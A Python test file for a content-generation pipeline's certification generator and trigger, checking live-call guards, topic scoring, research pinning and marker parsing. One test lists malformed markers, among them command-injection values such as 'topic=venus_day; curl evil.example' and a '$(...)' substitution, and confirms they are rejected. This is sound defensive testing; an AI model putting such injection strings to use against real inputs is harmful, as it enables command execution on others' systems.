#!/usr/bin/env python3
"""Zero-network regressions for quality_certification_generate.py."""
from __future__ import annotations

import json
import os
from pathlib import Path
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import quality_certification_generate as C
import quality_certification_trigger as T


def check(cond, label):
    if not cond:
        raise AssertionError(label)
    print(f"PASS {label}")


def test_two_part_live_guard_refuses_before_work():
    old = os.environ.pop("QUALITY_CERTIFICATION_LIVE", None)
    original = C.build_bundle
    called = {"n": 0}
    C.build_bundle = lambda *a, **k: called.__setitem__("n", called["n"] + 1)
    try:
        check(C.main(["--topic", "auto"]) == 2, "missing flag+env refuses")
        os.environ["QUALITY_CERTIFICATION_LIVE"] = C.LIVE_ACK
        check(C.main(["--topic", "auto"]) == 2, "env alone refuses")
        os.environ.pop("QUALITY_CERTIFICATION_LIVE", None)
        check(C.main(["--topic", "auto", "--allow-provider-calls"]) == 2, "flag alone refuses")
        check(called["n"] == 0, "refusal occurs before certification work")
    finally:
        C.build_bundle = original
        if old is not None:
            os.environ["QUALITY_CERTIFICATION_LIVE"] = old
        else:
            os.environ.pop("QUALITY_CERTIFICATION_LIVE", None)


def test_auto_topic_selection_is_fresh_and_quality_stack_first():
    original_bank = C._eligible_bank
    original_history = C._load_history
    original_scout = C.W.visual_scout_score
    facts = [
        {"id": "used_best", "domain": "space", "queries": ["a", "b"], "key_terms": ["x"]},
        {"id": "fresh_ok", "domain": "earth", "queries": ["a"], "key_terms": ["x"]},
        {"id": "fresh_best", "domain": "animals", "queries": ["a", "b", "c"], "key_terms": ["x", "y"]},
    ]
    scores = {"used_best": 10.0, "fresh_ok": 7.0, "fresh_best": 9.0}
    C._eligible_bank = lambda: facts
    C._load_history = lambda: [{"fact_id": "used_best"}]
    C.W.visual_scout_score = lambda fact, banned_re=None: {"score": scores[fact["id"]], "verdict": "test"}
    try:
        fact, evidence = C.select_topic("auto")
    finally:
        C._eligible_bank = original_bank
        C._load_history = original_history
        C.W.visual_scout_score = original_scout
    check(fact["id"] == "fresh_best", "auto mode avoids used topic and picks strongest fresh production story")
    check(evidence["mode"] == "auto_quality_stack_first_fresh" and evidence["shortlist"],
          "auto choice emits auditable quality-stack shortlist evidence")
    top = evidence["shortlist"][0]
    check("quality_stack_score" in top and "planned_treatment" in top and "authentic_science_query_hits" in top,
          "selection evidence explains production-lane advantages, not only one opaque score")


def test_authentic_science_can_break_a_close_visual_tie_but_not_rescue_weak_story():
    original_scout = C.W.visual_scout_score
    original_svs = C.SCI.svs_relevant
    original_pubchem = C.SCI.pubchem_relevant
    original_treatment = C.W.select_treatment
    C.W.visual_scout_score = lambda fact, banned_re=None: {"score": fact["scout"], "verdict": "test"}
    C.SCI.svs_relevant = lambda q: "nasa" in q
    C.SCI.pubchem_relevant = lambda q: "molecule" in q
    C.W.select_treatment = lambda *a, **k: "MYTH_AUTOPSY"
    try:
        generic = {"id": "generic", "scout": 8.0, "queries": ["animal running", "animal close"], "key_terms": ["animal"]}
        authentic = {"id": "authentic", "scout": 7.9, "queries": ["nasa hurricane", "nasa storm"], "key_terms": ["hurricane"]}
        weak = {"id": "weak", "scout": 3.0, "queries": ["nasa earth", "nasa climate"], "key_terms": ["earth"]}
        g = C._quality_lane_profile(generic, [])
        a = C._quality_lane_profile(authentic, [])
        w = C._quality_lane_profile(weak, [])
    finally:
        C.W.visual_scout_score = original_scout
        C.SCI.svs_relevant = original_svs
        C.SCI.pubchem_relevant = original_pubchem
        C.W.select_treatment = original_treatment
    check(a["quality_stack_score"] > g["quality_stack_score"],
          "authentic NASA lane correctly breaks a close visual-tellability tie")
    check(w["quality_stack_score"] < g["quality_stack_score"],
          "authentic-source bonus cannot rescue a fundamentally weak story")


def test_bundle_pins_one_research_result_through_writer_and_preflight():
    fact = {
        "id": "bridge_test",
        "domain": "earth",
        "fact": "A test glacier moves downhill under its own weight.",
        "wow": "The movement can be measured over time.",
        "whatif": "Why does solid ice move?",
        "key_terms": ["glacier", "ice"],
        "queries": ["glacier ice movement", "glacier aerial"],
    }
    original_select = C.select_topic
    original_history = C._load_history
    original_research = C.G.research_dossier
    original_generate = C.O.generate_candidate_v21
    calls = {"research": 0, "writer_internal_research": None}

    C.select_topic = lambda topic: (dict(fact), {"mode": "explicit", "selected_topic_id": "bridge_test"})
    C._load_history = lambda: []

    def fake_research(_fact):
        calls["research"] += 1
        return []
    C.G.research_dossier = fake_research

    def fake_generate(_fact, **kwargs):
        calls["writer_internal_research"] = C.G.research_dossier(_fact)
        scenes = [
            {"id": 1, "voiceover": "A glacier can move downhill under its own weight.",
             "search_query": "glacier ice movement", "source_claim_ids": ["base_001"], "_v2_role": "hook"},
            {"id": 2, "voiceover": "So why does solid ice move?",
             "search_query": "glacier close up", "source_claim_ids": ["base_003"], "_v2_role": "beat"},
            {"id": 3, "voiceover": "Its movement can be measured over time.",
             "search_query": "glacier aerial", "source_claim_ids": ["base_002"], "_v2_role": "payoff"},
        ]
        manifest = {
            "title": "Moving Ice",
            "hook": scenes[0]["voiceover"],
            "hook_source_claim_ids": ["base_001"],
            "payoff": scenes[-1]["voiceover"],
            "payoff_source_claim_ids": ["base_002"],
            "scenes": scenes,
            "script": " ".join(s["voiceover"] for s in scenes),
            "_v2_spoken_scene_count": 3,
            "_semantic_verified": True,
        }
        return manifest, {"accepted": True, "treatment": "HIDDEN_MECHANISM", "total_calls": 1, "rounds": []}
    C.O.generate_candidate_v21 = fake_generate

    try:
        with tempfile.TemporaryDirectory() as td:
            result = C.build_bundle("bridge_test", td)
            names = {p.name for p in Path(td).iterdir()}
            evidence = json.loads((Path(td) / "writer_evidence.json").read_text())
            session = json.loads((Path(td) / "quality_session_plan.json").read_text())
    finally:
        C.select_topic = original_select
        C._load_history = original_history
        C.G.research_dossier = original_research
        C.O.generate_candidate_v21 = original_generate

    check(calls["research"] == 1 and calls["writer_internal_research"] == [],
          "research is executed once then pinned exactly through writer generation")
    check(result["quality_session_ready"] is True, "accepted Writer evidence clears strict visual-session preflight")
    check({"manifest.json", "writer_debug.json", "writer_evidence.json", "quality_session_plan.json", "certification_selection.json"} <= names,
          "certification bundle writes every sealed handoff artifact")
    check("base_001" in evidence["manifest_referenced_claim_ids"], "evidence bundle preserves exact Writer claim IDs")
    check(session["upstream_traceability_passed"] is True and not session["blockers"],
          "quality session records no hidden traceability blocker")


def test_trusted_push_marker_can_select_fallback_topic():
    marker = "\n".join([
        "flagship-certification-requested=2026-09-08T15:45:00-05:00",
        "topic=eclipse_coincidence",
        "attempt=5",
        "purpose=private-artifact-only",
    ])
    check(T.resolve_topic("push", "", marker) == "eclipse_coincidence",
          "trusted main marker controls the push-bridge topic instead of a hard-coded Venus fallback")
    check(T.resolve_topic("workflow_dispatch", "venus_day", marker) == "venus_day",
          "manual workflow_dispatch topic remains authoritative for manual dispatches")
    check(T.resolve_topic("workflow_dispatch", "auto", marker) == "auto",
          "manual dispatch can still request deterministic auto-selection")


def test_trusted_push_marker_topic_is_fail_closed():
    bad_markers = [
        "attempt=5\npurpose=private-artifact-only",
        "topic=venus_day\ntopic=eclipse_coincidence",
        "topic=venus_day; curl evil.example",
        "topic=$(echo venus_day)",
        "topic=venus day",
    ]
    for marker in bad_markers:
        try:
            T.resolve_topic("push", "", marker)
        except T.TriggerError:
            pass
        else:
            raise AssertionError(f"malformed/ambiguous marker must fail closed: {marker!r}")
    check(True, "missing, duplicate, shell-like, and malformed topic controls all fail closed")


if __name__ == "__main__":
    test_two_part_live_guard_refuses_before_work()
    test_auto_topic_selection_is_fresh_and_quality_stack_first()
    test_authentic_science_can_break_a_close_visual_tie_but_not_rescue_weak_story()
    test_bundle_pins_one_research_result_through_writer_and_preflight()
    test_trusted_push_marker_can_select_fallback_topic()
    test_trusted_push_marker_topic_is_fail_closed()
    print("quality_certification_generate tests: PASS")
